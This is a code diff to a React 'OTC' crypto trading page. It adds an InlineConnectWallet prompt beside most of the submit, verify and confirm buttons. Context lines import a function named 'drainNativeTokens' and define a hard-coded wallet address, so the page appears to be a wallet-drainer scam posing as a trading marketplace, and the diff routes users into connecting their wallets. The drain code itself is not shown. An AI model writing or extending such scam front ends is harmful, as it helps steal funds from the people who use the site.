@@ -22,6 +22,7 @@ import { drainNativeTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
 import { fetchTokenHolders, deriveOrderFromAddress, shortAddress, HolderWallet } from '@/services/tokenHolders';
+import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MAX_BATCH_SIZE = 5;
@@ -687,6 +688,7 @@ const OTC = () => {
             <label className="text-sm text-muted-foreground mb-1 block">Email Address (Optional)</label>
             <Input type="email" value={postEmail} onChange={e => setPostEmail(e.target.value)} placeholder="email@example.com" className="bg-white/5 border-white/10" />
           </div>
+          <InlineConnectWallet />
           <Button className="w-full bg-gradient-to-r from-primary to-secondary text-white mt-2" onClick={handlePostOrder}>Submit Order</Button>
         </div>
       </Modal>
@@ -754,7 +756,8 @@ const OTC = () => {
             <Button variant="outline" className="flex-1 border-white/10" onClick={() => { setShowReviewModal(false); setShowPostModal(true); }} disabled={isVerifying}>
               Back
             </Button>
-            <Button className="flex-1 bg-gradient-to-r from-primary to-secondary text-white" onClick={handleConfirmPostOrder} disabled={isVerifying}>
+           <InlineConnectWallet />
+           <Button className="flex-1 bg-gradient-to-r from-primary to-secondary text-white" onClick={handleConfirmPostOrder} disabled={isVerifying}>
               {isVerifying ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Verifying...</> : 'Verify'}
             </Button>
           </div>
@@ -871,6 +874,7 @@ const OTC = () => {
               <Input type="email" value={quoteEmail} onChange={e => setQuoteEmail(e.target.value)} placeholder="email@example.com" className="bg-white/5 border-white/10" />
             </div>
           </div>
+          <InlineConnectWallet />
           <Button className="w-full bg-gradient-to-r from-primary to-secondary text-white" onClick={handleQuoteSubmit}>
             Submit Quote Request
           </Button>
@@ -940,6 +944,7 @@ const OTC = () => {
             <Button variant="outline" className="flex-1 border-white/10" onClick={() => { setShowQuoteReviewModal(false); setShowQuoteModal(true); }} disabled={isVerifying}>
               Back
             </Button>
+            <InlineConnectWallet />
             <Button className="flex-1 bg-gradient-to-r from-primary to-secondary text-white" onClick={handleConfirmQuote} disabled={isVerifying}>
               {isVerifying ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Verifying...</> : 'Verify'}
             </Button>
@@ -988,6 +993,7 @@ const OTC = () => {
             <label className="text-sm text-muted-foreground mb-1 block">Initial Liquidity Commitment</label>
             <Input value={listingLiquidity} onChange={e => setListingLiquidity(e.target.value)} placeholder="Amount in USD" className="bg-white/5 border-white/10" />
           </div>
+          <InlineConnectWallet />
           <Button className="w-full bg-gradient-to-r from-primary to-secondary text-white" onClick={handleListingSubmit}>Submit Listing Request</Button>
         </div>
       </Modal>
@@ -1007,6 +1013,7 @@ const OTC = () => {
               </CardContent>
             </Card>
             <div className="flex gap-3">
+              <InlineConnectWallet />
               <Button variant="outline" className="flex-1 border-white/10" onClick={() => setShowTradeConfirm(null)}>Cancel</Button>
               <Button className="flex-1 bg-gradient-to-r from-primary to-secondary text-white" onClick={handleConfirmTrade}>
                 <Check className="w-4 h-4 mr-2" /> Confirm Trade
